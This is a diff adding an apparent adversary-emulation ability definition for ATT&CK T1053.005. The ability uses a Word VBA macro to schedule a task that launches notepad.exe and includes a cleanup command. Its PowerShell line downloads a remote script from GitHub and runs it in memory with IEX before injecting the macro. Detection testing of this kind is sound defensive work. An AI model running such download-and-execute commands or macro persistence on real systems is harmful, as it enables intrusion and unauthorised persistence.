@@ -1,0 +1,25 @@
+---
+- id: 920a251237fac2b70fe4d647aa16bfdd
+  name: Task Scheduler via VBA
+  description: 'This module utilizes the Windows API to schedule a task for code execution
+    (notepad.exe). The task scheduler will execute "notepad.exe" within
+
+    30 - 40 seconds after this module has run
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1053.005
+    name: 'Scheduled Task/Job: Scheduled Task'
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing) ; Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt"
+          -officeProduct "Word" -sub "Scheduler"'
+        payloads: []
+        cleanup: Unregister-ScheduledTask -TaskName "Run Notepad" -Confirm:$false
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
